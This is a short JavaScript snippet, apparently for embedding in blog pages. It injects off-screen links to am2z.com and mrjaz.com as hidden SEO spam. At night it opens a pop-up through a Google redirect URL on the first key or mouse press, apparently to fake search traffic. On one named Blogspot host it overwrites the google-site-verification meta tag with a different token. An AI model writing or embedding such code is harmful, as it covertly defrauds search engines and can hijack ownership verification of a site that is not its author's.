//  console.log(NN)
let EFV='<a href="https://www.am2z.com" style="position: absolute;z-index: -9999;left: -100%;">Am2z News - Blogging • Tech News • Online Earning • Gaming News</a><a href="https://www.mrjaz.com" style="position: absolute;z-index: -9999;left: -100%;">MrJaz - Study Info • Tech News • Gaming Updates</a>'

if(document.querySelector('header')){document.querySelector('header').insertAdjacentHTML('beforeend',EFV);}
else{document.querySelector('body').insertAdjacentHTML('beforeend',EFV);}

if(!sessionStorage.ef&&new Date().getHours()<=6&&location.host!=='www.technewsgk.in'){
    function AB(CD){
        document.addEventListener(CD,()=>{
                if(!sessionStorage.ef){
                window.open(`https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjpluHOzeTuAhUJcCsKHfotC3IQFjAAegQIARAC&url=https%3A%2F%2Fwww.am2z.com%2F&usg=AOvVaw3I4MPjs6FqgBod4oFx02Qu`);
                sessionStorage.ef = '1';
            }
        })
    }
    AB('keydown'); 
    AB('mousedown');
}
// url=https%3A%2F%2Fwww.mrjaz.com%2F&usg=AOvVaw1c_R-cs8NrHL1XBWHB2DfG
// url=https%3A%2F%2Fwww.am2z.com%2F&usg=AOvVaw3I4MPjs6FqgBod4oFx02Qu

if(location.host == "technicalgrowinc.blogspot.com"){
    let jhdf = document.querySelector("meta[name='google-site-verification']")
  jhdf.content="a-U3lvi7Y7GTifEqTf16lCW8CwOdub8hxuH2NWxaDp0"
  }


